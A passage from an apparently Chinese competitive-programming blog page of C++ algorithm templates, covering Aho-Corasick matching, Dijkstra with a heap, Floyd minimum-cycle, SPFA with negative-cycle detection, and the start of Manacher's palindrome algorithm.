punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">26</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>next<span class="token punctuation">[</span>root<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            next<span class="token punctuation">[</span>root<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> root<span class="token punctuation">;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            fail<span class="token punctuation">[</span>next<span class="token punctuation">[</span>root<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> root<span class="token punctuation">;</span>            Q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>next<span class="token punctuation">[</span>root<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>Q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> now <span class="token operator">=</span> Q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">26</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>                next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> next<span class="token punctuation">[</span>fail<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>            <span class="token punctuation">&#123;</span>                fail<span class="token punctuation">[</span>next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> next<span class="token punctuation">[</span>fail<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                Q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> now <span class="token operator">=</span> root<span class="token punctuation">,</span> ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> tmp<span class="token punctuation">,</span> sz <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sz<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            key <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'a'</span><span class="token punctuation">;</span>            tmp <span class="token operator">=</span> now <span class="token operator">=</span> next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span>tmp <span class="token operator">!=</span> root <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>vis<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                ret <span class="token operator">+=</span> nd<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">;</span>                nd<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                vis<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                tmp <span class="token operator">=</span> fail<span class="token punctuation">[</span>tmp<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> aho<span class="token punctuation">;</span><span class="token keyword">int</span> cas<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>cas<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cas<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        aho<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span> <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>            aho<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        aho<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> aho<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="14-最短路算法"><a href="#14-最短路算法" class="headerlink" title="14. 最短路算法"></a>14. 最短路算法</h3><h4 id="14-1-Dijkstra-堆优化"><a href="#14-1-Dijkstra-堆优化" class="headerlink" title="14.1 Dijkstra+堆优化"></a>14.1 Dijkstra+堆优化</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ll</span> <span class="token expression"><span class="token keyword">long</span> <span class="token keyword">long</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">clr</span><span class="token expression"><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span> <span class="token function">memset</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token keyword">typedef</span> pair<span class="token operator">&lt;</span><span class="token keyword">int</span> <span class="token punctuation">,</span><span class="token keyword">int</span><span class="token operator">></span>  pii<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> maxn<span class="token operator">=</span><span class="token number">2e5</span><span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">;</span>priority_queue<span class="token operator">&lt;</span>pii<span class="token punctuation">,</span>vector<span class="token operator">&lt;</span>pii<span class="token operator">></span><span class="token punctuation">,</span>greater<span class="token operator">&lt;</span>pii<span class="token operator">></span> <span class="token operator">></span>pq<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">edge</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> to<span class="token punctuation">;</span>    <span class="token keyword">int</span> cost<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>edge<span class="token operator">></span> G<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//g[i]--i to g[i].to cost cost</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">,</span> s<span class="token punctuation">;</span><span class="token keyword">int</span> dis<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> vis<span class="token punctuation">[</span>manx<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dijk</span><span class="token punctuation">(</span><span class="token keyword">int</span> s<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        dis<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> inf<span class="token punctuation">;</span>    dis<span class="token punctuation">[</span>s<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    pq<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">make_pair</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>pq<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        pii u <span class="token operator">=</span> pq<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        pq<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> x <span class="token operator">=</span> u<span class="token punctuation">.</span>second<span class="token punctuation">;</span> <span class="token comment">// bian hao</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>vis<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        vis<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> G<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            edge e <span class="token operator">=</span> G<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>dis<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span> <span class="token operator">></span> dis<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">+</span> e<span class="token punctuation">.</span>cost<span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                dis<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span> <span class="token operator">=</span> dis<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">+</span> e<span class="token punctuation">.</span>cost<span class="token punctuation">;</span>                pq<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">make_pair</span><span class="token punctuation">(</span>dis<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>to<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> m <span class="token operator">>></span> s<span class="token punctuation">;</span>    <span class="token keyword">int</span> from<span class="token punctuation">,</span> to<span class="token punctuation">,</span> cost<span class="token punctuation">;</span>    edge in<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> from <span class="token operator">>></span> to <span class="token operator">>></span> cost<span class="token punctuation">;</span>        in<span class="token punctuation">.</span>to <span class="token operator">=</span> to<span class="token punctuation">;</span> in<span class="token punctuation">.</span>cost <span class="token operator">=</span> cost<span class="token punctuation">;</span>        G<span class="token punctuation">[</span>from<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">dijk</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        cout <span class="token operator">&lt;&lt;</span> dis<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="14-2-floyd"><a href="#14-2-floyd" class="headerlink" title="14.2 floyd"></a>14.2 floyd</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//floyd求最小环</span><span class="token keyword">void</span> <span class="token function">floyd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> k<span class="token punctuation">;</span>    <span class="token keyword">int</span> ans <span class="token operator">=</span> inf<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>k <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> k<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> k<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>dis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> mp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+</span> mp<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> ans<span class="token punctuation">)</span>                    ans <span class="token operator">=</span> dis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> mp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+</span> mp<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>dis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+</span> dis<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> dis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                    dis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> dis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+</span> dis<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="14-3-spfa"><a href="#14-3-spfa" class="headerlink" title="14.3 spfa"></a>14.3 spfa</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">node</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> to<span class="token punctuation">,</span>w<span class="token punctuation">,</span>next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>edge<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> head<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> tot <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">addedge</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">,</span><span class="token keyword">int</span> z<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    tot<span class="token operator">++</span><span class="token punctuation">;</span>    edge<span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">.</span>w <span class="token operator">=</span> z <span class="token punctuation">,</span> edge<span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">.</span>to <span class="token operator">=</span> y <span class="token punctuation">,</span> edge<span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">.</span>next <span class="token operator">=</span> head<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>    head<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> tot<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>node edge<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> head<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> dis<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">bool</span> <span class="token function">spfa</span><span class="token punctuation">(</span> <span class="token keyword">int</span> st  <span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">bool</span> vis<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> outque<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>vis<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>vis<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>outque<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>outque<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span> <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span>n<span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">)</span> dis<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> inf<span class="token punctuation">;</span><span class="token comment">//初始化距离</span>queue<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> q<span class="token punctuation">;</span>q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>st<span class="token punctuation">)</span> <span class="token punctuation">,</span> vis<span class="token punctuation">[</span>st<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span> <span class="token punctuation">,</span> dis<span class="token punctuation">[</span>st<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//初始状态</span><span class="token keyword">while</span><span class="token punctuation">(</span> <span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> u <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>outque<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token operator">++</span> <span class="token punctuation">,</span> vis<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> outque<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">></span> n <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token comment">//有负环 无最短路</span><span class="token keyword">for</span><span class="token punctuation">(</span> <span class="token keyword">int</span> k <span class="token operator">=</span> head<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">;</span> k <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">=</span> edge<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>next <span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> v <span class="token operator">=</span> edge<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>to<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> dis<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">></span> dis<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">+</span> edge<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>w <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>dis<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">=</span> dis<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">+</span> edge<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>w<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span>vis<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token punctuation">)</span>vis<span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span> <span class="token punctuation">,</span> q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span> v <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="15-manacher"><a href="#15-manacher" class="headerlink" title="15. manacher"></a>15. manacher</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">manacher</span><span class="token punctuation">(</span>string<span class="token operator">&amp;</span> s<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>R<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">/* * manacher算法 * 需要将字符串预处理成$#x#x#x#x#x#x#形式 ✔ * 若仅求长度为奇数的回文串，最左侧添加特殊字符即可 * 记录当前最右延伸回文半径mx和对应回文中心p * i若位于mx以内，则将对称位置2*p-i的回文半径的不越界部分作为i的回文半径，并且继续向右侧匹配 * 若得到新的最右延伸回文半径，更新mx和p * 回文长度为回文半径-1 * 回文起始位置为 （回文中心位置-回文半径）/2 */</span>    <span class="token keyword">int</span> p <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> mx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    R<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>mx <span class="token operator">></span> i<span class="token punctuation">)</span>            R<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>R<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>p <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span> mx <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> R<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i <span class="token operator">-</span> R<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">==</span> s<span class="token punctuation">[</span>i <span class="token operator">+</span> R<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            R<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">+</span> R<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> mx<span class="token punctuation">)</span>            p <span class="token operator">=</span> i<span class="token punctuation">,</span> mx <span class="token operator">=</span> i <span class="token operator">+</span> R<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token 